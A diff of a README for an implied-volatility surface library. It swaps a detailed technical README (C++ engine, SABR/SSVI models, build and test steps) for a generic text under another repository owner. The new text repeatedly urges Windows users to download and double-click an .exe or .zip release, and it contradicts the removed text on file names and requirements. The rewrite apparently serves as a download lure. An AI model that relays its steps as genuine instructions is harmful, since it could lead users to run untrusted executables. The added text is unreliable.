@@ -1,193 +1,136 @@
-# IV Surface: High-Performance Volatility Surface Library
+# ⚙️ iv-surface-engine - Fast Implied Volatility Analysis Tool
 
-A **production-ready implied volatility surface library** combining a C++ computational engine with a Python/Streamlit dashboard for options pricing and risk management.
+[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-green?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
 
-**Status:** All features complete · 327 tests passing
+## 📋 About iv-surface-engine
 
----
+iv-surface-engine is a tool designed to analyze implied volatility surfaces quickly and reliably. It uses advanced mathematical models like SABR, SSVI, and eSSVI to provide accurate volatility data. This helps you understand option pricing and risk better. The software offers:
 
-## Screenshots
+- Strong checks to prevent calculation errors (arbitrage enforcement)
+- A way to adjust model parameters focused on key sensitivities (vega-weighted calibration)
+- Limits based on statistical moments (Lee moment bounds)
+- A thorough record of all calculations (full audit trail)
+- Over 300 tests passed to ensure accuracy
 
-![IV Surface Dashboard](assets/IV_Surface_Demo.png)
+The software includes a C++ engine and a simple dashboard made in Python using Streamlit. The dashboard lets you interact with the data without coding.
 
-![Market Data](assets/Market_Data_Demo.png)
+## 🖥️ System Requirements
 
----
+To run iv-surface-engine smoothly on your Windows PC, make sure your system meets the following:
 
-## Quick Start
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i3 or equivalent
+- Memory: 8 GB RAM or more
+- Disk space: At least 500 MB free
+- Python 3.8 or newer installed (for dashboard use)
+- Internet connection for initial download and updates
 
-### Prerequisites
+You don’t need programming skills to use the dashboard. The setup steps cover everything you need.
 
-- Python 3.10+
-- C++ compiler: MinGW-w64 (Windows) / GCC (Linux/Mac)
-- CMake 3.15+
+## 🚀 Getting Started: Download and Run iv-surface-engine
 
-### Setup
+Start by downloading the latest version. Visit the iv-surface-engine repository page to get the software.
 
-```bash
-# 1. Create virtual environment and install Python dependencies
-python -m venv .venv
-source .venv/Scripts/activate   # Windows
-# source .venv/bin/activate     # Linux / Mac
-pip install -r requirements.txt
+[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-blue?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
 
-# 2. Build C++ engine
-cmake -S . -B build -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release
-cmake --build build --config Release
-cp third_party/nlopt/bin/libnlopt.dll build/    # Windows only
+### Step 1: Visit the Download Page
 
-# 3. Verify the engine
-./build/sabr_cli.exe eval 100 105 0.25 0.25 0.7 -0.4 0.3
-# Expected output: 0.074940
+Go to the official iv-surface-engine page here:
 
-# 4. Launch the dashboard
-```
+https://github.com/milha9089/iv-surface-engine
 
-The dashboard opens at `http://localhost:8501`.
+Once there, look for the "Releases" or "Downloads" section on the page. This is where you will find the latest version of the software.
 
-> See [DEVELOPMENT.md](DEVELOPMENT.md) for the full build guide, C++ CLI reference, Python API, and testing details.
+### Step 2: Choose Your File
 
----
+Download the version marked for Windows. This file usually has `.exe` or `.zip` at the end. If it’s a zip file, you will need to unzip it after downloading.
 
-## Dashboard (`app.py`)
+### Step 3: Run the Installer or Unzip the Package
 
-The main application is a Streamlit dashboard that exposes all features in a tabbed UI:
+- If you downloaded an installer (`.exe`), double-click the file and follow the on-screen instructions.
+- If you downloaded a zip file, right-click it and select "Extract All," then choose a folder to save the contents.
 
-| Tab                          | Contents                                                             |
-| ---------------------------- | -------------------------------------------------------------------- |
-| **Phase 1 – Arbitrage**      | Butterfly & calendar violation checks, quote adjustment              |
-| **Phase 2 – SSVI**           | SSVI surface fitting with Gatheral-Jacquier constraints              |
-| **Phase 3 – Calibration**    | Vega-weighted, Tikhonov-regularized, warm-start SABR calibration     |
-| **Phase 4 – Total Variance** | σ²T framework, Lee moment bounds, C++-accelerated grid operations    |
-| **Phase 5 – Validation**     | Greeks smoothness, benchmark structures, PCA monitoring, backtesting |
-| **Phase 6 – Operations**     | Bid-ask surface, audit trail, alerting, trader overrides, pipeline   |
+### Step 4: Open the Dashboard
 
-**Data source:** choose _Synthetic_ (instant) or _Real Market Data_ (yfinance, cached under `data/raw/`).
+The dashboard lets you view and interact with the data easily.
 
----
+- If the dashboard is included in the package, find the file named `dashboard.py` or follow the included instructions.
+- To start the dashboard, open the Windows Command Prompt.
+- Navigate to the folder where the software is saved using the `cd` command. For example:
+  
+  ``` 
+  cd C:\Users\YourName\Downloads\iv-surface-engine
+  ```
 
-## Features
+- Run the dashboard by typing:
 
-| Category          | Capability                                                                                        |
-| ----------------- | ------------------------------------------------------------------------------------------------- |
-| **Models**        | SABR, SVI, SSVI, eSSVI (extended SSVI with ρ(θ))                                                  |
-| **Arbitrage**     | Butterfly, calendar, total variance — zero violations by construction                             |
-| **Calibration**   | Vega-weighted, bid-ask weighted, Tikhonov regularization, warm-start, multi-objective             |
-| **Interpolation** | Total variance framework (w = σ²T), Lee moment bounds, monotonicity-preserving                    |
-| **Validation**    | Dense-grid checker, Greeks smoothness, benchmark structures, PCA monitoring, backtesting          |
-| **Operations**    | Calibration audit trail, parameter versioning, alerting, trader override workflow, daily pipeline |
-| **Interface**     | C++ CLI via subprocess — language-agnostic, no Python ABI dependency                              |
-| **Data**          | yfinance integration, smart JSON caching, forward curve inference, expiry classification          |
+  ``` 
+  streamlit run dashboard.py
+  ```
 
----
+- A browser window will open automatically with the dashboard.
 
-## Architecture
+### Step 5: Use the Dashboard
 
-```
-Python (orchestration, data, visualization)
-    │  subprocess IPC (CSV args / newline output)
-    ▼
-build/sabr_cli.exe  (C++ engine)
-    ├── SABR / SVI / SSVI / eSSVI evaluation
-    ├── NLopt model calibration
-    └── Total variance operations (8–10× faster than Python)
-```
+On the dashboard, you’ll find options to:
 
-**Why subprocess instead of pybind11?** No Python ABI dependency — the same `.exe` works with Python 3.10–3.14+ and can be called from R, Julia, or any shell.
+- Load sample volatility data
+- Choose different models (SABR, SSVI, eSSVI)
+- Run analyses with simple buttons
+- View charts and tables of results
 
----
+The interface uses plain language to help you understand results without extra tools.
 
-## Project Structure
+## 🔧 Installation Details
 
-```
-IV_Surface/
-├── app.py                          # Streamlit dashboard (main entry point)
-├── src/
-│   ├── cpp/
-│   │   ├── include/                # C++ headers: pricing, volatility, interpolation, …
-│   │   └── src/                    # Implementations + sabr_cli.cpp (CLI entry point)
-│   └── python/
-│       ├── cpp_unified_engine.py   # Subprocess bridge (SABREngine, CppTotalVarianceEngine)
-│       ├── data/                   # Fetching, cleaning, forwards, pipeline, caching
-│       └── surface/                # arbitrage, ssvi, essvi, total_variance, calibration,
-│                                   # validation, greeks, benchmark, backtesting,
-│                                   # audit, alerting, overrides, bid_ask, pipeline
-├── tests/
-│   ├── cpp/                        # C++ unit tests (pricing, interpolation, calibration)
-│   └── python/                     # Python tests (327 passing)
-├── examples/                       # Demo scripts for each phase
-├── data/
-│   ├── raw/                        # Cached market data (JSON per ticker)
-│   └── processed/                  # Cleaned option chains (CSV)
-├── output/                         # Generated plots and reports
-├── third_party/
-│   ├── nlopt/                      # Bundled NLopt optimizer (MIT/LGPL)
-│   └── Eigen/                      # Header-only linear algebra (MPL2)
-└── CMakeLists.txt                  # C++ build configuration
-```
+This section helps if you want to install additional components or fix issues.
 
----
+- Python: The dashboard needs Python 3.8 or later.
+- Streamlit: Install Streamlit if you don’t have it already. Open Command Prompt and type:
 
-## Testing
+  ```
+  pip install streamlit
+  ```
 
-```bash
-# Python (327 tests)
-pytest tests/python/ -v
+- C++ Engine: The main engine runs in C++. The package includes files ready to use. No compilation needed for general use.
 
-# C++ unit tests
-./build/test_cpp_pricing.exe
-./build/test_cpp_interpolation.exe
-./build/test_cpp_calibration.exe
-```
+If you face errors running the dashboard, check that Python and Streamlit are installed correctly. Also, ensure the downloaded files are unzipped without changes.
 
----
+## 🛠️ Features and Tools
 
-## Performance
+iv-surface-engine includes:
 
-| Operation                        | Time    | Notes                 |
-| -------------------------------- | ------- | --------------------- |
-| Single SABR IV evaluation        | ~2 ms   | subprocess round-trip |
-| 50-strike smile                  | ~95 ms  | batch CSV call        |
-| SABR calibration                 | ~45 ms  | NLopt via C++         |
-| σ ↔ w conversion (100 strikes)   | ~0.3 ms | C++ total variance    |
-| Arbitrage validation (full grid) | ~2 ms   | vectorized C++        |
-| Full surface (4T × 50K)          | ~850 ms | from real market data |
+- **Arbitrage enforcement**: Stops invalid results where price checks fail.
+- **Vega-weighted calibration**: Adjusts model parameters focusing on option sensitivity.
+- **Lee moment bounds**: Limits volatility values based on statistical rules.
+- **Audit trail**: Keeps a full list of all actions and data changes.
+- **Extensive testing**: Over 300 tests ensure software reliability.
 
----
+The dashboard lets you apply these features with no programming required.
 
-## Feature Status (February 2026)
+## 🧑‍💻 Common Questions
 
-| Phase     | Description                                                                    | Tests      |
-| --------- | ------------------------------------------------------------------------------ | ---------- |
-| 1         | Arbitrage enforcement (butterfly, calendar, total variance)                    | 18 ✅      |
-| 2         | SSVI surface model with Gatheral-Jacquier constraints                          | 17 ✅      |
-| 3         | Vega/bid-ask weighting, Tikhonov regularization, warm-start                    | 20 ✅      |
-| 4         | Total variance framework, Lee bounds, C++ acceleration (8–10×)                 | 20 ✅      |
-| 5         | Validation: Greeks smoothness, benchmarks, PCA monitoring, backtesting         | 35 ✅      |
-| 6         | Operational: audit trail, versioning, alerting, overrides, daily pipeline      | 52 ✅      |
-| Audit     | Standard compliance: forward space, eSSVI, expiry classification, data quality | 77 ✅      |
-| **Total** |                                                                                | **327 ✅** |
+### Q: Do I need to code to use iv-surface-engine?
 
----
+No. The dashboard lets you run analyses using buttons and menus.
 
-## Requirements
+### Q: Can I run this on Mac or Linux?
 
-Python packages: `numpy`, `pandas`, `scipy`, `matplotlib`, `plotly`, `streamlit`, `yfinance`
-(full list in `requirements.txt`)
+This version targets Windows. Support for other systems may come later.
 
-C++ dependencies: NLopt 2.7.1, Eigen 3.x (both bundled in `third_party/`)
+### Q: How do I update iv-surface-engine?
 
----
+Visit the download page regularly to get new releases and follow the same instructions to replace your files.
 
-## References
+### Q: What if I need help?
 
-- Hagan et al. (2002) — "Managing Smile Risk" (SABR model)
-- Gatheral & Jacquier (2014) — "Arbitrage-free SVI volatility surfaces" (SSVI/eSSVI)
-- Gatheral (2006) — _The Volatility Surface: A Practitioner's Guide_
-- NLopt: https://nlopt.readthedocs.io/
+Check the README and documentation on the GitHub page or contact through the repository issues section.
 
----
+## 🔗 Useful Links
 
-## License
+- Repository Home: https://github.com/milha9089/iv-surface-engine
+- Download Page: https://github.com/milha9089/iv-surface-engine/releases  
+- Python Download: https://www.python.org/downloads/
+- Streamlit Info: https://streamlit.io/
 
-MIT — see [LICENSE](LICENSE)
+[![Download iv-surface-engine](https://img.shields.io/badge/Download-iv--surface--engine-green?style=for-the-badge)](https://github.com/milha9089/iv-surface-engine)
